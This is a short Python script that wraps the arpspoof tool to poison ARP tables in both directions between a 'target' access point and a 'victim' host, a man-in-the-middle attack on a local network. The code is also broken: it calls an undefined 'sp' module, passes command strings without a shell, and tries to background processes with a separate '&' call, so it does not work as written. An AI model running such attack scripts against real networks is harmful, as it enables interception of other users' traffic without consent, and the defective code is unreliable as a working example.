import subprocess
import optparse

parser = optparse.OptionParser()
parser.add_option("-t","--target",dest="target",help="target machine like access point")
parser.add_option("-victim","--victim",dest="victim",help="victim like the hosts")
(options, arguments) = parser.parse_args()

target = options.target
victim = options.victim

sp.call(f"arpspoof -i wlp2s0 -t {target} {victim}")
sp.run("&")
sp.call(f"arpspoof -i wlp2s0 -t {victim} {target}")
sp.call("&")
